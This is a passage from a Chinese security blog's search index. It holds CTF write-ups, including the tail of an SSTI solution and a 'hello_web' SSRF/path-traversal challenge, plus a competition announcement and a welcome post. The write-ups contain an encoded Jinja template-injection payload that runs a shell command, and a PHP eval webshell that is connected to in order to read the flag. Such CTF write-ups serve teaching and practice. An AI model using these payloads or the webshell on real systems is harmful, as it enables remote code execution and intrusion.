class="line">%22%7B%25set%20ax%20%3D%20%27so%27%5B%3A%3A-1%5D%25%7D%22</span><br><span class="line">%22%7B%7Bcycler.next%5Bgl%5D%5Bbu%5D%5Bim%5D(ax)%5B%27P%27%27open%27%5D(%27cat%20%2Fflag%20%3E%20app.py%27).read()%7D%7D%22</span><br></pre></td></tr></table></figure><ol start="7"><li><p>构造code进行post提交，返回状态为ok</p></li><li><p>获取flag</p></li></ol><ul><li>get访问路由&#x2F;，就会访问到app.py</li><li>我们就可以访问到falg</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0c518973-d0c3-49c1-bb4f-44f3074f484c&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WEB </category>
          
          <category> SSTI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 竞赛 </tag>
            
            <tag> CTF </tag>
            
            <tag> 国内竞赛 </tag>
            
            <tag> WEB </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届‘长城杯’WEB篇—Hello_web</title>
      <link href="/post/c39f6c79/"/>
      <url>/post/c39f6c79/</url>
      
        <content type="html"><![CDATA[<h1 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h1><p>这是一道经典的ssrf题目，因为题目比较简单，很多队伍都解出来了，多以这道题最后只有50分</p><h2 id="一、什么是SSRF？"><a href="#一、什么是SSRF？" class="headerlink" title="一、什么是SSRF？"></a>一、什么是SSRF？</h2><p><em><strong>SSRF</strong></em>（全称为<em><strong>Server-Side Request Forgery，服务器端请求伪造）是一种常见的</strong>安全漏洞</em><em>，属于<strong>WEB安全</strong>范畴。<br><strong>攻击者</strong>通过利用SSRF漏洞，可以让服务器在**</em>未经授权***的情况下向其他内部或外部资源发起请求，从而达到攻击的目的。</p><hr><h3 id="SSRF的原理"><a href="#SSRF的原理" class="headerlink" title="SSRF的原理"></a>SSRF的原理</h3><p>SSRF漏洞的产生主要是因为服务器端程序在处理用户提供的URL或请求参数时，<strong>没有对输入进行严格验证</strong>，直接将这些数据作为请求目标，发起HTTP&#x2F;HTTPS请求或其他协议的请求。</p><p>攻击者通过精心构造恶意的URL或输入，利用服务器发起请求，进而实现访问<strong>内部网络</strong>或受保护的资源。</p><hr><h2 id="二、本题WriteUp"><a href="#二、本题WriteUp" class="headerlink" title="二、本题WriteUp"></a>二、本题WriteUp</h2><p>题目下发后，打开地址只有如下的显示<br><img src="/../../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web/1.png" alt="初始题目展示"></p><h3 id="（一）好奇宝宝的探索"><a href="#（一）好奇宝宝的探索" class="headerlink" title="（一）好奇宝宝的探索"></a>（一）好奇宝宝的探索</h3><p>只有一句话和一段Base64编码字符串，其他就没有什么了~</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">SSd2ZSBsZXQgeW91IGInbm9yZSBOaGlzIHBhcmFncmFwaC4=</span></span><br></pre></td></tr></table></figure><p>本着好奇的心，虽然也知道那是不可能的（这段Base64编码字符串就是Flag）</p><p>果然不出所料，CTF的Flag不会那么容易给你的，解码之后的内容就是对中文显示的翻译。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">I&#x27;ve</span> <span class="string">let</span> <span class="string">you</span> <span class="string">b&#x27;nore</span> <span class="string">Nhis</span> <span class="string">paragraph.</span></span><br></pre></td></tr></table></figure><h3 id="（二）查看源码，发现马脚"><a href="#（二）查看源码，发现马脚" class="headerlink" title="（二）查看源码，发现马脚"></a>（二）查看源码，发现马脚</h3><p>继续找吧，既然页面没有任何破绽，<em><strong>看看页面的源码</strong></em>，果然有问题！</p><ol><li><p>源码注释内容泄露的两个文件的路径(还是先探索一番)分别是..&#x2F;hackme.php和..&#x2F;tips.php<br><img src="/../../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web/2.png" alt="查看页面源码"></p></li><li><p>查看上一级目录的hackme.php<br><img src="/../../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web/3.png" alt="..&#x2F;hackme.php"></p></li><li><p>在看看上一级目录的tips.php<br><img src="/../../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web/4.png" alt="..&#x2F;tips.php"></p></li></ol><p>哈哈~，狗屎，就不会这么简单的，不过还没打击到我们好奇宝宝的信息</p><h3 id="（三）峰回路转，眼前答案"><a href="#（三）峰回路转，眼前答案" class="headerlink" title="（三）峰回路转，眼前答案"></a>（三）峰回路转，眼前答案</h3><p>其实他泄露的文件路径就给了我们一点点提示，既然要返回上一级目录，那么我们不妨试试<em><strong>目录穿越</strong></em></p><ul><li>这个要一级一级来，万一我们一下子穿越了两级，由于老天不给我们运气，错过了Flag就要哭死了，呜呜呜~~~</li></ul><ol><li><p>先试试一下tips.php这个文件，穿了一级就<em><strong>泄露出敏感信息</strong></em> <em><strong>Phpinfo</strong></em><br><img src="/../../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web/5.png" alt="tips.php泄露Phpinfo"></p></li><li><p>再试试hackme.php这个文件，既然能叫hackme，说明他肯定有大问题，同样穿了一级就爆出来东西<em><strong>是一个马</strong></em><br><img src="/../../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web/6.png" alt="hackme.php是一个马"></p></li><li><p>这个马是经过处理的，我们对他进行<em><strong>反混</strong></em>，得到马的密码<br><img src="/../../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web/7.png" alt="马的反混处理的到密码"></p></li></ol><ul><li>得到马的密码内容</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?&gt;&lt;?php</span> <span class="string">@eval($POST[&#x27;cmd_66.99&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure><ol start="4"><li><p>很明显，注入这个马的文件为<em><strong>cmd_66.99</strong></em>，那么我们可以直接用<em><strong>蚁剑</strong></em>通过<em><strong>disable_functions</strong></em>来连接到这个马，<em><strong>获取webshell</strong></em><br><img src="/../../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web/8.png" alt="获取webshell"></p></li><li><p>进入shell命令行读取flag<br>在根目录下，用通配符*查找以flag开头的所有文件</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure><p><img src="/../../media/img/essay/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D-WEB-hello_web/9.png" alt="获取flag"></p><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WEB </category>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 竞赛 </tag>
            
            <tag> CTF </tag>
            
            <tag> 国内竞赛 </tag>
            
            <tag> WEB </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届‘长城杯’铁人三项赛（防护赛）赛事详细介绍</title>
      <link href="/post/e85a88e9/"/>
      <url>/post/e85a88e9/</url>
      
        <content type="html"><![CDATA[<h1 id="第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）赛事详细介绍"><a href="#第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）赛事详细介绍" class="headerlink" title="第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）赛事详细介绍"></a>第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）赛事详细介绍</h1><p><img src="https://media.giphy.com/media/l41YqFxS5x6EYD7y4/giphy.gif" alt="InfoSec_Competition"> <em>激发创新，挑战极限</em></p><h2 id="一、赛事背景与目的"><a href="#一、赛事背景与目的" class="headerlink" title="一、赛事背景与目的"></a>一、赛事背景与目的</h2><p>本次竞赛由中国信息安全测评中心和教育部高等学校网络空间安全专业教学指导委员会联合主办，旨在深入践行总体国家安全观，<br>积极落实国家网络空间安全人才战略，通过竞赛形式实现以赛促学、以赛促教、以赛促用，提升网络空间安全学科教育质量和效率，<br>促进网络安全教育、技术、产业的加速融合，推动人才培养和产学研用生态发展。</p><h2 id="二、赛事组织机构"><a href="#二、赛事组织机构" class="headerlink" title="二、赛事组织机构"></a>二、赛事组织机构</h2><ul><li><strong>主办单位</strong>：中国信息安全测评中心、教育部高等学校网络空间安全专业教学指导委员会</li><li><strong>承办单位</strong>：相关高校和信息安全机构</li></ul><h2 id="三、初赛时间和地点"><a href="#三、初赛时间和地点" class="headerlink" title="三、初赛时间和地点"></a>三、初赛时间和地点</h2><ul><li><strong>时间</strong>：2024年12月15日</li><li><strong>地点</strong>：线上同步开展，全国共设置五个分赛区</li></ul><h2 id="四、赛事内容与形式"><a href="#四、赛事内容与形式" class="headerlink" title="四、赛事内容与形式"></a>四、赛事内容与形式</h2><p>竞赛分为理论知识考核和实操技能解题两个部分，涵盖信息安全基础知识、安全法律法规及标准规范、密码学、WEB安全、逆向工程、PWN等多个领域。</p><h3 id="1-理论知识考核"><a href="#1-理论知识考核" class="headerlink" title="1. 理论知识考核"></a>1. 理论知识考核</h3><ul><li><strong>信息安全基础知识</strong>：20道题，初级难度，涵盖信息安全保障、管理、支撑技术等基础知识。</li><li><strong>法律法规及安全标准</strong>：10道题，初级难度，涉及《网络安全法》、《个人信息安全保护法》等法律法规的了解程度。</li></ul><h3 id="2-实操技能解题"><a href="#2-实操技能解题" class="headerlink" title="2. 实操技能解题"></a>2. 实操技能解题</h3><ul><li><strong>威胁检测与网络流量分析</strong>：19道题，中高级难度，考查选手对恶意代码、程序、流量的识别、检测分析和还原能力。</li><li><strong>密码学</strong>：4道题，中高级难度，包括编码解码、古典密码学、现代密码学算法等。</li><li><strong>WEB安全</strong>：7道题，中高级难度，涉及WEB应用常见安全风险和网络攻击的掌握程度。</li><li><strong>逆向工程</strong>：5道题，高级难度，考查选手对二进制代码的逆向分析和理解能力。</li><li><strong>PWN</strong>：6道题，高级难度，涉及二进制漏洞的挖掘和利用能力。</li></ul><h2 id="五、参赛要求"><a href="#五、参赛要求" class="headerlink" title="五、参赛要求"></a>五、参赛要求</h2><p>参赛队伍需按照初赛参赛队伍答题要求进行答题，命题组负责赛题的罐装测试，并交由裁判组进行审核确认。赛题一经确认，任何单位和个人不得再做修改。</p><h2 id="六、奖项设置"><a href="#六、奖项设置" class="headerlink" title="六、奖项设置"></a>六、奖项设置</h2><ul><li>根据参赛队伍的总成绩，设置一、二、三等奖及优秀奖。</li><li>对于表现突出的个人选手，将颁发特别奖项。</li></ul><h2 id="七、赛事意义"><a href="#七、赛事意义" class="headerlink" title="七、赛事意义"></a>七、赛事意义</h2><p>本次竞赛不仅是对大学生信息安全知识和技能的一次全面检验，也是推动信息安全教育和实践的重要平台。<br>通过竞赛，可以激发学生的创新精神，提高解决实际问题的能力，为国家培养更多优秀的信息安全专业人才。</p><p><em>本次竞赛共吸引来自国内865所高校、4240支队伍的14145名学生参赛，涵盖全国33个省、自治区和直辖市，以及香港和澳门特别行政区。<br>来自中山大学、北京邮电大学、哈尔滨工业大学等高校共计500支战队将晋级半决赛。晋级名单将在赛事官方网站公布。</em></p><p><img src="https://media.giphy.com/media/xT9Igrx8K4JtWOia72/giphy.gif" alt="InfoSec_Challenge"> <em>网络安全，智慧对决</em></p><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 竞赛 </tag>
            
            <tag> CTF </tag>
            
            <tag> 国内竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你好，欢迎来到 HxCodeWarrior 的技术世界</title>
      <link href="/post/bb947332/"/>
      <url>/post/bb947332/</url>
      
        <content type="html"><![CDATA[<h1 id="你好，欢迎来到-HxCodeWarrior-的技术世界！-🎉"><a href="#你好，欢迎来到-HxCodeWarrior-的技术世界！-🎉" class="headerlink" title="你好，欢迎来到 HxCodeWarrior 的技术世界！ 🎉"></a>你好，欢迎来到 HxCodeWarrior 的技术世界！ 🎉</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>你好！欢迎来到 <strong>HxCodeWarrior</strong> 博客，一个专注于技术分享的学习与交流平台。不论你是刚踏入技术领域的萌新，还是在网络安全与编程道路上探索多年的老手，我希望这里能为你提供灵感、知识和实战技能。  </p><hr><h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a><strong>关于我</strong></h2><p>我是 <strong>HxCodeWarrior</strong>，一个对技术充满热爱与好奇的开发者与安全研究者。<br>从大学开始，我便投身于网络安全与编程领域：  </p><ul><li>🛡️ 参与过多次 <strong>CTF（Capture The Flag）比赛</strong>，积累了解题思路与经验；  </li><li>🕵️‍♂️ 深入研究 <strong>渗透测试</strong> 和漏洞挖掘；  </li><li>⚙️ 自主开发 <strong>黑客工具</strong>；  </li><li>🕸️ 探索爬虫技术与自动化工具开发的应用场景。</li></ul><p>多年的学习与实践让我深刻体会到分享的价值——技术世界里没有人是孤岛，我们都能通过交流获得成长。因此，我创建了这个博客，希望记录我的技术旅程，同时为更多技术爱好者提供有价值的干货内容。  </p><hr><h2 id="为什么创建-HxCodeWarrior-博客？"><a href="#为什么创建-HxCodeWarrior-博客？" class="headerlink" title="为什么创建 HxCodeWarrior 博客？"></a><strong>为什么创建 HxCodeWarrior 博客？</strong></h2><p>我的初衷很简单：  </p><ol><li><p><strong>记录成长</strong> 🎯<br>写作是对自己思路的梳理，也是一种沉淀经验的方式。我希望通过博客记录学习的过程，回顾成长中的点滴。  </p></li><li><p><strong>分享知识</strong> 💡<br>我相信，技术的意义在于共享。希望自己的文章能帮助到迷茫中的新手，或是为有经验的技术人提供一些新思路。  </p></li><li><p><strong>启发交流</strong> 🌟<br>通过分享实战经验和技巧，吸引志同道合的朋友加入讨论，一起探索技术的更多可能性。</p></li></ol><hr><h2 id="博客内容方向"><a href="#博客内容方向" class="headerlink" title="博客内容方向"></a><strong>博客内容方向</strong></h2><p>这里将持续更新以下几大技术方向的内容：  </p><ul><li><p><strong>CTF 挑战解析</strong> 🧩<br>分享 CTF 解题思路与实战技巧，包括漏洞利用、逆向分析、密码学等领域。  </p></li><li><p><strong>渗透测试实战</strong> 🔍<br>解析渗透测试工具、漏洞挖掘与防御策略，涵盖从入门到进阶的攻防实践。  </p></li><li><p><strong>黑客工具开发与使用</strong> 🛠️<br>深入探讨热门工具的功能与开发逻辑，从工具的用户变成工具的创造者。  </p></li><li><p><strong>爬虫技术教程</strong> 🕷️<br>系统讲解爬虫开发流程，从基础抓取到数据清洗与大规模自动化的高级技巧。  </p></li><li><p><strong>编程与技术教程</strong> 📜<br>涉及 Python、Selenium、Burp Suite 等工具与框架，提供从零开始的编程实践指南。</p></li></ul><hr><h2 id="适合谁看？"><a href="#适合谁看？" class="headerlink" title="适合谁看？"></a><strong>适合谁看？</strong></h2><ul><li><strong>技术小白</strong> 🎈<br>从零开始的详细教程，带你踏入网络安全与编程的世界。  </li><li><strong>正在成长的技术爱好者</strong> 🚀<br>实用的技巧与案例，帮助你快速上手并不断进步。  </li><li><strong>进阶玩家</strong> 🧠<br>深度分析与实践经验，让你在技术领域更进一步。</li></ul><hr><h2 id="社交链接"><a href="#社交链接" class="headerlink" title="社交链接"></a><strong>社交链接</strong></h2><p>如果你喜欢我的内容，欢迎通过以下平台关注我，一起交流、学习和成长！  </p><ul><li><strong>GitHub</strong>: <a href="https://github.com/HxCodeWarrior">HxCodeWarrior</a>   </li><li><strong>Bilibili</strong>: <a href="https://space.bilibili.com/3537114050332802">HxCodeWarrior 的空间</a></li></ul><p>我会在这些平台上同步分享技术文章、视频教程，以及一些有趣的项目，期待与你互动！  </p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>技术的魅力在于无限可能，而这种可能性来自于每个人的热情与努力。<br>我希望 <strong>HxCodeWarrior</strong> 博客能成为你技术旅程中的一盏灯，帮助你发现更大的技术世界。  </p><p>无论你是想解决技术难题，还是寻找成长的灵感，我都欢迎你加入我们的学习与交流！  </p><p><strong>欢迎留言与分享你的想法，让我们一起见证彼此的成长！</strong>  </p><hr><p><strong>HxCodeWarrior</strong><br><em>记录、分享、启发，让技术更有温度。</em> ❤️  </p><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
